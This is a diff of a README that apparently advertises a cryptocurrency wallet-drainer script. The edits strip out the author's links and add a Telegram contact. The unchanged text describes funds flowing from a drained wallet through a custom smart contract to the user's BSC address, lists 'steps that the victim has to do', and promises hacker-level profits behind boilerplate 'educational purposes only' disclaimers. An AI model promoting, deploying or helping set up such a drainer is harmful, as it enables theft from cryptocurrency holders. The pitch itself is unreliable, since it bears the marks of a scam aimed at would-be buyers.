@@ -1,6 +1,6 @@
-### Read my common myths and scams before buying scripts from anyone on github https://github.com/moneywithbots/Common-scams-and-myths- ###
 
-### Please only use this for educational purposes not too hack others Please use for testing or educational purposes only by using this script you authorize this script to make transactions if you do not feel ok with this script doing that please do not use this script or buy the direct one https://moneywithbots.sellix.io/ ###
+
+### Please only use this for educational purposes not too hack others Please use for testing or educational purposes only by using this script you authorize this script to make transactions if you do not feel ok with this script doing that please do not use this script ###
 
 
 This is the same method pro hackers use to make millions
@@ -11,9 +11,7 @@ This is the same method pro hackers use to make millions
 Instructions on how to start are below ⬇️
 
               ##########
-              
-
-### Read my common myths and scams before looking else where for scripts https://github.com/moneywithbots/Common-scams-and-myths- ###
+            
 
 
             Deploy steps
@@ -39,7 +37,7 @@ info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
 
 !!!
 
-### my youtube tutorial https://youtu.be/ESxOvW-IOg0 ###
+
 
 
 !!!
@@ -58,7 +56,7 @@ Make sure you fork this project before doing the tutorial here is how to fork ht
 ### HOW IT WORKS FOR FREE VERSION ###
 
 ### REMEMBER THE FREE VERSION IS ONLY MENT TO BE A TRIAL A DEMO ###
-
+                                      Telegram @freewayrickyross
 
 Wallet gets drained ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
@@ -119,7 +117,7 @@ Steps that the !!! victim !!! has to do
 !!!!!!!!!!!!!!!!!!! Cloning this script will not allow my software to send money to you do not clone if you test this script if you do you will be less likely to recieve payments from testing !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
 
-
+Telegram @freewayrickyross
 
 FAQ (frequently asked questions)
 
@@ -161,6 +159,7 @@ Any futher questions can be answered by fulling reading this scripts readme all 
 
 !!!!!!!!!!!Please only use this for educational purposes not too hack others Please use for testing or educational purposes only  Make sure you read everything before using this script moneywithbots is not responsible for mistakes or tester who dont spend the time to full read this readme by using this script you accept everything listed in this script in the readme if you dont want to agree to my terms for testing and educational purposes do not use this script. Do not use this script on innocent people moneywithbots will not be held responsible for someone who does that this script was only designed for educational or testing purposes to futher increase the security of crypto in the future please read the terms of service and disclaimer before actually using or testing this script money with bots will assume that all users understand everything stated in the disclaimer and terms of service. Dont use this with out reading everything in detail.!!!!!!!!!!!!!!
 
+Telegram @freewayrickyross
 
 MIT License
 
